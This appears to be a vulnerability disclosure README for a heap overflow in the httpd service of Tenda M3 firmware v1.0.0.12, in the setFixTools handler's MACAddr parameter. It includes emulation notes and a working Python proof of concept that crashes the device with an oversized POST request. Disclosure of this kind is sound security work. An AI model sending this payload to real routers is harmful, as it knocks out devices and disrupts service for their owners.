# Tenda M3 contains heap Overflow Vulnerability

## overview

- type: heap overflow vulnerability

- supplier: Tenda https://www.tenda.com 

- product: TendaM3 https://www.tenda.com.cn/product/M3.html

- firmware download:   https://www.tenda.com.cn/download/detail-3133.html

- affect version: TendaM3 v1.0.0.12(4856)

## Description

### 1. Vulnerability Details

the `httpd` in directory `/bin` has a heap buffer overflow. The vunlerability is in fucntion `formSetFixTools` 

It calls `malloc(0x28)` to allocate heap buffer, and it  copies POST parameter`MACAddr` tp heap buffer. 

![image-20220819225634877](readme.assets/image-20220819225634877.png)

It didn’t check the value of `v23` and calls `strncpy`, so there is a heap overflow. 

### 2. Recurring loopholes and POC

use qemu-arm-static to run the `httpd`, we need to patch it before run. 

- in `main` function, The `ConnectCfm` function didn’t work properly, so I patched it to `NOP` 
- The `R7WebsSecurityHandler` function is used for permission control, and I've modified it to access URLs that can only be accessed after login

poc of DOS(deny of service) **(We need to send request twice)**

```python
import requests

data = {
    "networkTool": "3",
	"operation": "start", 
	"MACAddr": "a"*0x800
}
cookies = {
    "user": "admin"
}
res = requests.post("http://127.0.0.1/goform/setFixTools", data=data, cookies=cookies)
print(res.content)
res = requests.post("http://127.0.0.1/goform/setFixTools", data=data, cookies=cookies)
print(res.content)
```

![image-20220819225829292](readme.assets/image-20220819225829292.png)

![image-20220819225959290](readme.assets/image-20220819225959290.png)